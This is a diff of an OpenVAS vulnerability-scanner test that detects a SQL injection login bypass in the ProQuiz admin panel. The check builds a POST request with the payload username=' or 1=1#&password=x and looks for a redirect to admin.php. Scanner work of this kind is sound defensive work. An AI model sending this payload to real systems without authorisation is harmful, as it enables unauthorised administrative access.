@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: ProQuiz_sql_injection.nasl 5016 2017-01-17 09:06:21Z teissa $
+# $Id: ProQuiz_sql_injection.nasl 5770 2017-03-29 14:34:03Z cfi $
 #
 # ProQuiz 'Username' and 'Password' Parameters SQL Injection
 # Vulnerability
@@ -28,17 +28,15 @@
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.100040");
- script_version("$Revision: 5016 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-17 10:06:21 +0100 (Tue, 17 Jan 2017) $");
+ script_version("$Revision: 5770 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 16:34:03 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
  script_bugtraq_id(32724);
  script_cve_id("CVE-2008-6312","CVE-2008-6327");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
  script_name("ProQuiz 'Username' and 'Password' Parameters SQL Injection Vulnerability");
-
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -65,39 +63,36 @@ include("http_keepalive.inc");
 port = get_http_port(default:80);
 if(!can_host_php(port:port))exit(0);
 
-host = http_host_name( port:port );
+foreach dir( make_list_unique( "/proquiz", cgi_dirs( port:port ) ) ) {
 
-dirs = make_list("/proquiz",cgi_dirs());
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/admin/index.php");
+  buf = http_get_cache(item:url, port:port);
+  if( buf == NULL )continue;
 
-foreach dir (dirs) {
+  if( egrep(pattern: "This is the Admin Panel of TRDC.IN", string: buf) ) {
 
-    url = string(dir, "/admin/index.php");
-    req = http_get(item:url, port:port);
-    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-    if( buf == NULL )continue;
+    host = http_host_name( port:port );
 
-    if( egrep(pattern: "This is the Admin Panel of TRDC.IN", string: buf) ) {
+    variables = string("username=' or 1=1#&password=x");
+    url = string(dir + "/admin/index.php");
 
-	    variables = string("username=' or 1=1#&password=x");
-	    filename = string(dir + "/admin/index.php");
+    req = string(
+      "POST ", url, " HTTP/1.0\r\n", 
+      "Referer: ","http://", host, url, "\r\n",
+      "Host: ", host, "\r\n", 
+      "Content-Type: application/x-www-form-urlencoded\r\n", 
+      "Content-Length: ", strlen(variables), 
+      "\r\n\r\n", 
+      variables );
+    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-	    req = string(
-	      "POST ", filename, " HTTP/1.0\r\n", 
-	      "Referer: ","http://", host, filename, "\r\n",
-	      "Host: ", host, "\r\n", 
-	      "Content-Type: application/x-www-form-urlencoded\r\n", 
-	      "Content-Length: ", strlen(variables), 
-	      "\r\n\r\n", 
-	      variables
-	    );
-
-	    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-	    if(egrep(pattern: "Location: admin.php", string: result)) {
-	         security_message(port:port);
-	         exit(0);
-	     }
+    if(egrep(pattern: "Location: admin.php", string: res)) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
+  }
 }
 
-exit(99);
+exit( 99 );
